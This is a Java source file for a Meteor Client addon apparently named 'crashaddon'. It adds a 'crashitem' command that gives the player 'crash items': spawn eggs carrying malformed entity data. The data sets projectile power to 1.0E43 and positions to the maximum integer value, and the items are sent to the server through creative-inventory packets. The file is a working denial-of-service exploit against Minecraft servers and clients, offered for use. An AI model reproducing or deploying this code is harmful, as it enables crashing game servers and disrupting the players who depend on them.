package de.frxstdev.crashaddon.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import net.minecraft.command.CommandSource;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

public class CrashItemCommand extends Command {

    public CrashItemCommand() {
        super("crashitem", "Gives you crash items.");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("CrashFireball").executes(ctx -> {
            ItemStack CrashFireball = new ItemStack(Items.CAVE_SPIDER_SPAWN_EGG);
            NbtCompound tag1 = new NbtCompound();
            NbtList power = new NbtList();
            power.add(NbtDouble.of(1.0E43));
            power.add(NbtDouble.of(0));
            power.add(NbtDouble.of(0));
            tag1.putString("id", "minecraft:small_fireball");
            tag1.put("power", power);
            CrashFireball.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(tag1));
            CreativeInventoryActionC2SPacket balls = new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, CrashFireball);
            mc.getNetworkHandler().sendPacket(balls);
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("CrashSkull").executes(ctx -> {
            ItemStack CrashFireball = new ItemStack(Items.CAVE_SPIDER_SPAWN_EGG);
            NbtCompound tag1 = new NbtCompound();
            NbtList power = new NbtList();
            power.add(NbtDouble.of(1.0E43));
            power.add(NbtDouble.of(0));
            power.add(NbtDouble.of(0));
            tag1.putString("id", "minecraft:wither_skull");
            tag1.put("power", power);
            CrashFireball.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(tag1));
            CreativeInventoryActionC2SPacket balls = new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, CrashFireball);
            mc.getNetworkHandler().sendPacket(balls);
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("CrashArrow").executes(ctx -> {
            ItemStack CrashFireball = new ItemStack(Items.WITHER_SPAWN_EGG);
            NbtCompound tag2 = new NbtCompound();
            NbtList power = new NbtList();
/*            power.add(NbtDouble.of(1.0E43));
            power.add(NbtDouble.of(0));
            power.add(NbtDouble.of(0));*/

            tag2.put("power", power);
            CrashFireball.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(tag2));
            CreativeInventoryActionC2SPacket balls = new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, CrashFireball);
            mc.getNetworkHandler().sendPacket(balls);
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("OOBEgg").executes(ctx -> {
            ItemStack gato = new ItemStack(Items.CAT_SPAWN_EGG);
            NbtCompound tag3 = new NbtCompound();
            NbtList pos = new NbtList();

            pos.add(NbtDouble.of(2147483647));
            pos.add(NbtDouble.of(2147483647));
            pos.add(NbtDouble.of(2147483647));
            tag3.putString("id", "minecraft:small_fireball");
            tag3.put("Pos", pos);
            gato.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(tag3));
            CreativeInventoryActionC2SPacket elgato = new CreativeInventoryActionC2SPacket(36 + mc.player.getInventory().selectedSlot, gato);
            mc.getNetworkHandler().sendPacket(elgato);
            return SINGLE_SUCCESS;
        }));

    }
}
